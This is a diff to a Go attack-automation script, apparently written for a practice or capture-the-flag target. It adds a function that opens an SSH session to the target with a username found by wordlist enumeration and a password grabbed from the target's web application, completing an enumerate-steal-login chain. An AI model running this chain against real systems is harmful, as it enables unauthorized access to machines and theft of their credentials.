@@ -6,11 +6,13 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
 	"os"
+	"os/exec"
 	"strings"
 	"sync"
 	"time"
@@ -364,6 +366,66 @@ func FindUsername(baseURL string, wordlist string, threadcount int) (success boo
 	return success, message
 }
 
+//============================================================
+//
+// Function Name: SSHConnection
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to initialize an SSH
+//    connection with the target machine using a discovered
+//    username and credentials. Right now, the attacker must
+//    manually enter the credentials. Once the credentials are
+//    entered, a stable SSH connection will be opened with the
+//    target machine.
+//
+// Input(s):
+//
+//    targetIP - string. IP address of target.
+//
+// Return(s):
+//
+//    success - bool. indication of successful SSH attempt.
+//    message - string. status message.
+//
+//============================================================
+func SSHConnection(targetIP string) (success bool, message string) {
+	for i := 0; i < 60; i++ {
+		fmt.Printf("=")
+	}
+	fmt.Printf("\n")
+	InfMsg("Initializing SSH Connection")
+	for i := 0; i < 60; i++ {
+		fmt.Printf("=")
+	}
+	fmt.Printf("\n\n")
+
+	cmd := exec.Command("ssh", fmt.Sprintf("%s@%s", USERNAMES_DISCOVERED[0], targetIP))
+	readpipe, writepipe := io.Pipe()
+
+	cmd.Stdout = writepipe
+	cmd.Stdin = os.Stdin
+
+	go io.Copy(os.Stdout, readpipe)
+
+	cmd.Run()
+
+	fmt.Printf("\n\n")
+	for i := 0; i < 60; i++ {
+		fmt.Printf("=")
+	}
+	fmt.Printf("\n")
+	InfMsg("SSH Connection Closed")
+	for i := 0; i < 60; i++ {
+		fmt.Printf("=")
+	}
+	fmt.Printf("\n\n")
+
+	return true, "SSH connection successful"
+}
+
 func ValidatePort(portno int) (valid bool, message string) {
 	if (portno < 1) || (portno > 65535) {
 		return false, "port must be within range 1 - 65535"
@@ -417,6 +479,7 @@ func main() {
 
 	var message string
 
+	var sshpassword string
 	var success bool
 
 	var targetIP string
@@ -480,13 +543,23 @@ func main() {
 			os.Exit(1)
 		}
 		if len(SESSIONS_GRANTED.Jar.Cookies(cookieurl)) > 0 {
-			sshpassword, success, message := GrabSSHPass(baseURL)
+			sshpassword, success, message = GrabSSHPass(baseURL)
 			if !success {
 				ErrMsg(message)
 				os.Exit(1)
 			}
 			SucMsg(fmt.Sprintf("SSH Password: %s", sshpassword))
+		} else {
+			ErrMsg("no valid creds discovered")
+			os.Exit(1)
 		}
+
+		success, message = SSHConnection(targetIP)
+		if !success {
+			ErrMsg(message)
+			os.Exit(1)
+		}
+		SucMsg(message)
 	}
 	return
 }
